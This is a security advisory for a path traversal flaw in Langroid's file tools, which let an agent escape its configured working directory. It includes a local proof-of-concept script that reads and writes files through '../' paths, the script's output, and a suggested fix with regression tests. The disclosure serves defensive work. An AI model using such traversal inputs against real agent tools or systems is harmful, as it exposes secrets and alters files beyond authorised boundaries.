# [H] Langroid: Path traversal in the file tools allows read/write outside configured current directory

## Summary
Severity: High
Advisory: GHSA-fg23-3346-88f5
CVE: CVE-2026-50181
CWE: CWE-22, CWE-23
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-fg23-3346-88f5
Type: github-advisory

## Affected
- PyPI: `langroid` — affected >=0 <0.64.0

## Details
### Summary

Langroid's `ReadFileTool` and `WriteFileTool` appear to treat `curr_dir` as the intended working-directory boundary for file operations. However, the tools only change the process working directory to `curr_dir` and then operate on the user-supplied `file_path` without resolving and enforcing that the final path remains inside `curr_dir`.

As a result, a tool caller can supply path traversal sequences such as `../secret.txt` to read files outside the configured current directory, or `../written_by_tool.txt` to write files outside that directory.

This can impact applications that expose Langroid file tools to an LLM agent, user-controlled tool call, or delegated coding/documentation agent while relying on `curr_dir` to restrict file access to a project/workspace directory.

### Details

Affected components:

- `langroid/agent/tools/file_tools.py`
- `langroid/utils/system.py`

Relevant behavior observed:

`ReadFileTool` contains a comment indicating the intended assumption:

```text
# ASSUME: file_path should be relative to the curr_dir

The tool then changes into the configured current directory and calls read_file(self.file_path).

WriteFileTool similarly resolves curr_dir, changes into that directory, and calls create_file(self.file_path, self.content).

The issue is that changing the process working directory does not prevent traversal. A path such as ../secret.txt is still valid and resolves outside the configured curr_dir.

In local testing, ReadFileTool successfully read a file outside the configured sandbox directory, and WriteFileTool successfully wrote a file outside the configured sandbox directory.

PoC

Tested locally against the current Langroid repository checkout.

Environment:

Python 3.12
Langroid installed in editable mode with pip install -e .

PoC script:

from pathlib import Path
from tempfile import TemporaryDirectory
import os

os.environ["docker"] = "false"
os.environ["DOCKER"] = "false"

from langroid.agent.tools.file_tools import ReadFileTool, WriteFileTool


class DummyIndex:
    def add(self, files):
        print("dummy git add:", files)

    def commit(self, message):
        print("dummy git commit:", message)


class DummyRepo:
    index = DummyIndex()


with TemporaryDirectory() as root:
    base = Path(root)
    sandbox = base / "sandbox"
    sandbox.mkdir()

    secret = base / "secret.txt"
    secret.write_text("LANGROID_TOOL_ESCAPE_PROOF", encoding="utf-8")

    ReadSandbox = ReadFileTool.create(get_curr_dir=lambda: sandbox)
    read_tool = ReadSandbox(file_path="../secret.txt")

    print("READ TOOL RESULT:")
    print(read_tool.handle())

    WriteSandbox = WriteFileTool.create(
        get_curr_dir=lambda: sandbox,
        get_git_repo=lambda: DummyRepo(),
    )

    write_tool = WriteSandbox(
        file_path="../written_by_tool.txt",
        content="WRITTEN_BY_LANGROID_TOOL",
        language="text",
    )

    print("WRITE TOOL RESULT:")
    print(write_tool.handle())

    outside = base / "written_by_tool.txt"
    print("outside exists:", outside.exists())
    print("outside content:", outside.read_text(encoding="utf-8"))

Observed output:

READ TOOL RESULT:

    CONTENTS of ../secret.txt:
    (Line numbers added for reference only!)
    ---------------------------
    1: LANGROID_TOOL_ESCAPE_PROOF

WRITE TOOL RESULT:
Content created/updated in: ..\written_by_tool.txt
dummy git add: ['../written_by_tool.txt']
dummy git commit: Agent write file tool
Content written to ../written_by_tool.txt and committed
outside exists: True
outside content: WRITTEN_BY_LANGROID_TOOL

This demonstrates that both read and write operations can escape the configured curr_dir using ../ traversal.

Impact

If an application enables Langroid's file tools and treats curr_dir as a project, workspace, repository, or sandbox boundary, a tool caller can escape that boundary.

Potential impact includes:

Reading files outside the intended workspace.
Writing files outside the intended workspace.
Exposing local secrets, configuration files, source files, environment files, or other project-adjacent files.
Modifying files outside the intended project directory if WriteFileTool is enabled.

This is especially relevant in agentic workflows where an LLM or external user can influence tool arguments.

This report does not claim unauthenticated remote exploitation by default. The impact depends on how an application exposes Langroid file tools and whether curr_dir is intended to restrict file access.

Suggested remediation

Before reading, writing, or listing files, resolve the configured base directory and the requested target path, then reject any path that escapes the base directory.

Example patch pattern:

from pathlib import Path

def safe_join(base_dir: str | Path, user_path: str | Path) -> Path:
    base = Path(base_dir).resolve()
    target = (base / user_path).resolve()

    if target != base and base not in target.parents:
        raise ValueError("Path escapes configured current directory")

    return target

Then use the resolved safe path for ReadFileTool, WriteFileTool, and ListDirTool.

Suggested regression tests:

ReadFileTool(file_path="../secret.txt") should be rejected.
WriteFileTool(file_path="../outside.txt") should be rejected.
Absolute paths outside curr_dir should be rejected.
Symlink-based escapes should be rejected after final path resolution.
Normal relative paths inside curr_dir, such as src/main.py, should continue to work.

[Langroid CVE Report.pdf](https://github.com/user-attachments/files/28333958/Langroid.CVE.Report.pdf)

## References
- https://github.com/langroid/langroid/security/advisories/GHSA-fg23-3346-88f5
- https://github.com/langroid/langroid/commit/56e2756ecab70a70a7e6edbee2f2187b8484683e
- https://github.com/langroid/langroid
